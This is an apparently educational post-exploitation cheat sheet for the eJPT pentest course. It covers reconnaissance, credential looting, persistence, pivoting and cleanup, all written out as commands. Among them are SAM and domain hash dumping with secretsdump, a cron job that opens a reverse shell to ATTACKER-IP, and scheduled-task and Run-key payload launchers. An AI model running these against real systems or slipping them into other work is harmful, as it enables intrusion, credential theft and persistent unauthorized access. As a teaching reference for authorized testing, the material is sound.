# Post-Exploitation Cheat Sheet

Post-exploitation is everything that happens after you've landed a shell — figuring out where you are, grabbing what's valuable, deciding whether to maintain access, and reaching further into the network from that foothold; this document ties those threads together as a single cross-tool reference for the eJPT "Host & Network Penetration Testing: Post-Exploitation" module. For the mechanics it deliberately doesn't repeat, see `netcat-reverse-shell-cheatsheet-professional.md` for shell stabilization and file transfer, `linux-windows-pentest-cheatsheet-professional.md` for privilege escalation specifically, and `active-directory-enumeration-cheatsheet-professional.md` for domain-wide lateral movement and credential attacks.

---

## Table of Contents

1. [Post-Exploitation as a Phase](#1-post-exploitation-as-a-phase)
2. [Situational Awareness](#2-situational-awareness)
3. [Loot & Credential Collection](#3-loot--credential-collection)
4. [Persistence Mechanisms](#4-persistence-mechanisms)
5. [Pivoting & Port Forwarding](#5-pivoting--port-forwarding)
6. [Cleanup Considerations](#6-cleanup-considerations)
7. [Quick Command Reference](#7-quick-command-reference)

---

## 1. Post-Exploitation as a Phase

Post-exploitation covers everything between "I have a shell" and "objective complete," and eJPT breaks it down into four rough, overlapping sub-goals.

| Sub-goal | Question it answers |
|---|---|
| **Situational awareness** | Where am I? Who am I? What does this host/network look like? |
| **Loot / credential collection** | What data or credentials on this host help me reach the objective or another host? |
| **Persistence** | If I lose this shell, can I get back in without re-exploiting? |
| **Pivoting** | Can I reach hosts/subnets that aren't directly reachable from my attacker machine? |

> **Note:** Privilege escalation is closely related but is treated as its own phase in this collection — see `linux-windows-pentest-cheatsheet-professional.md`. Post-exploitation here assumes you already have *a* shell, at whatever privilege level, and are deciding what to do with it.

---

## 2. Situational Awareness

The first few commands run on any freshly-landed shell, before doing anything else, to establish who you are and where you landed.

```bash
# --- Linux ---
id                          # Current user, UID/GID, group memberships
hostname                    # Machine name — often reveals its role (DC01, WEB-PROD, etc.)
ip a                        # Network interfaces — reveals other subnets this host bridges
cat /etc/os-release         # Distro and version — needed for exploit/privesc matching
```

```powershell
# --- Windows ---
whoami /all                 # User, SID, groups, and privileges in one shot
systeminfo                  # OS build, patch level, domain membership, uptime
ipconfig /all                # Interfaces, DNS, DHCP — same "other subnets" logic as ip a
```

> **Note:** `ipconfig /all` / `ip a` output is often the first hint that a pivot is needed — a second NIC or an additional route means there's a network segment beyond the one you landed in (see Section 5).

---

## 3. Loot & Credential Collection

Loot collection means systematically checking the handful of places credentials and sensitive data tend to sit on a freshly-compromised host.

| Location | OS | Command / path |
|---|---|---|
| Bash command history | Linux | `cat ~/.bash_history` |
| SSH private keys | Linux | `find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null` |
| Config files with plaintext creds | Both | `grep -ri "password" /etc/*.conf /var/www/**/*.config 2>/dev/null` |
| Browser saved passwords | Both | Firefox `logins.json` / `key4.db`, Chrome `Login Data` SQLite file |
| Windows Credential Manager | Windows | `cmdkey /list` |
| SAM + SYSTEM hives (local hashes) | Windows | `reg save HKLM\SAM sam.save` / `reg save HKLM\SYSTEM system.save`, then dump offline |
| NTDS.dit (domain hashes, on a DC) | Windows | pull via `secretsdump.py` — see cross-reference below |

```bash
# Linux — common credential sweep
cat ~/.bash_history /root/.bash_history 2>/dev/null
find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null
grep -ril "password" /etc /var/www /opt 2>/dev/null

# Windows — Credential Manager and stored creds
cmdkey /list
findstr /si password *.txt *.xml *.ini *.config

# Dump local SAM (requires local admin), then crack/pass offline
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL

# Dump domain hashes from a DC (requires domain admin creds)
secretsdump.py DOMAIN/user:password@dc-ip
```

> **Note:** `secretsdump.py` against `NTDS.dit`/domain credentials belongs conceptually to the domain-wide attack chain — see `active-directory-enumeration-cheatsheet-professional.md` for how those dumped hashes feed into pass-the-hash and further lateral movement.

---

## 4. Persistence Mechanisms

Persistence means planting a mechanism that survives a reboot or a dropped shell so the tester (or attacker) can regain access without re-exploiting the original vulnerability — relevant to eJPT conceptually and to how blue teams later investigate an incident, even though it's frequently out of scope on a real engagement.

| Mechanism | OS | Command |
|---|---|---|
| Cron job | Linux | `(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") \| crontab -` |
| Scheduled task | Windows | `schtasks /create /sc minute /mo 1 /tn "Update" /tr "C:\payload.exe" /ru SYSTEM` |
| Registry Run key | Windows | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\payload.exe"` |
| SSH authorized key | Linux | `echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys` |

```bash
# Linux — cron-based persistence (runs every minute)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") | crontab -

# Linux — SSH key persistence
mkdir -p ~/.ssh && echo "ssh-rsa AAAA...attacker-pubkey" >> ~/.ssh/authorized_keys
```

```powershell
# Windows — scheduled task persistence
schtasks /create /sc minute /mo 1 /tn "Update" /tr "C:\payload.exe" /ru SYSTEM

# Windows — registry Run key persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\payload.exe"
```

> **Note:** On a real authorized engagement, planting persistence is usually explicitly out of scope unless the RoE calls for it (e.g. a dedicated persistence/objective test) — confirm before touching cron, scheduled tasks, or Run keys on a client system, and always document and remove anything planted before the engagement closes.

---

## 5. Pivoting & Port Forwarding

Pivoting lets you reach a second internal network segment that isn't directly routable from your attacker machine by tunneling traffic through a host you've already compromised.

```bash
# SSH local port forwarding — bring a remote port to your own machine
ssh -L 8080:internal-target:80 user@pivot-host

# SSH remote port forwarding — expose a local port on the pivot host
ssh -R 4444:127.0.0.1:4444 user@pivot-host

# SSH dynamic port forwarding (SOCKS proxy) — route arbitrary traffic through the pivot
ssh -D 1080 user@pivot-host
# then, with proxychains:
proxychains nmap -sT -Pn internal-target

# Chisel tunnel (works without SSH, agent/server model)
# On the attacker (server):
chisel server -p 8000 --reverse
# On the target (client):
chisel client ATTACKER-IP:8000 R:socks

# Meterpreter port forwarding + routing (from an existing session)
meterpreter > portfwd add -l 8080 -p 80 -r internal-target
meterpreter > run autoroute -s internal-subnet/24
```

| Technique | Direction | Use case |
|---|---|---|
| `ssh -L` (local forward) | Attacker → pivot → target | Reach one known internal port through the pivot |
| `ssh -R` (remote forward) | Pivot → attacker | Expose an attacker-side service back through the pivot |
| `ssh -D` (dynamic/SOCKS) | Attacker → pivot → anywhere | Route arbitrary tools (nmap, browser) via proxychains |
| Chisel | Either | No SSH available, or need a fast HTTP-based tunnel |
| Meterpreter `portfwd` / `autoroute` | Either | Already inside a Meterpreter session, no extra tooling needed |

> **Note:** Pivoting matters whenever `ip a` / `ipconfig /all` on a compromised host reveals a second NIC or route that your attacker machine can't reach directly — without a tunnel, tools like nmap or Hydra simply can't send packets to that segment at all.

---

## 6. Cleanup Considerations

Cleanup, in the context of an authorized engagement, means leaving the target environment as close as possible to how it was found — not evading detection, since the client's blue team and RoE define what's acceptable, not the tester.

| Consideration | Action |
|---|---|
| Dropped tools/binaries | Delete uploaded files (`linpeas.sh`, `nc.exe`, payloads) from disk once no longer needed |
| Persistence mechanisms | Remove any cron job, scheduled task, registry key, or SSH key added during testing |
| Created accounts | Remove any local/domain accounts created for testing purposes |
| Log artifacts | Be aware that shell history, event logs, and auth logs will record actions — note this in the report rather than tampering with logs |
| Session state | Close reverse/bind shell listeners and terminate persistent sessions cleanly |

```bash
# Linux — remove dropped tools and persistence
rm -f /tmp/linpeas.sh /tmp/payload
crontab -l | grep -v "ATTACKER-IP" | crontab -
sed -i '/attacker-pubkey/d' ~/.ssh/authorized_keys
```

```powershell
# Windows — remove dropped tools and persistence
Remove-Item C:\payload.exe -Force
schtasks /delete /tn "Update" /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /f
```

> **Note:** Under RoE-compliant terms, tampering with or deleting the target's own security/audit logs is generally out of bounds — cleanup means removing what *you* added, not covering tracks in the client's logging. If log manipulation is genuinely required (e.g. a dedicated adversary-emulation engagement), that must be explicitly authorized in writing beforehand.

---

## 7. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| Linux quick ID | `id` |
| Linux hostname | `hostname` |
| Linux interfaces | `ip a` |
| Linux OS version | `cat /etc/os-release` |
| Windows quick ID | `whoami /all` |
| Windows system info | `systeminfo` |
| Windows interfaces | `ipconfig /all` |
| Linux bash history | `cat ~/.bash_history` |
| Find SSH private keys | `find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null` |
| Windows Credential Manager | `cmdkey /list` |
| Dump local SAM | `reg save HKLM\SAM sam.save` |
| Dump hashes offline | `secretsdump.py -sam sam.save -system system.save LOCAL` |
| Dump domain hashes | `secretsdump.py DOMAIN/user:password@dc-ip` |
| Linux cron persistence | `(crontab -l; echo "* * * * * cmd") \| crontab -` |
| Windows scheduled task persistence | `schtasks /create /sc minute /mo 1 /tn "Update" /tr "C:\payload.exe" /ru SYSTEM` |
| Windows Run key persistence | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\payload.exe"` |
| SSH local port forward | `ssh -L 8080:internal-target:80 user@pivot-host` |
| SSH dynamic (SOCKS) forward | `ssh -D 1080 user@pivot-host` |
| Chisel reverse tunnel | `chisel server -p 8000 --reverse` (attacker) / `chisel client IP:8000 R:socks` (target) |
| Meterpreter port forward | `portfwd add -l 8080 -p 80 -r internal-target` |
| Meterpreter add route | `run autoroute -s internal-subnet/24` |
| Remove Linux cron persistence | `crontab -l \| grep -v "ATTACKER-IP" \| crontab -` |
| Remove Windows scheduled task | `schtasks /delete /tn "Update" /f` |

---

*Prepared as a reference for the eJPT host/network pentest module. All techniques should only be used within written authorization (scope/RoE).*
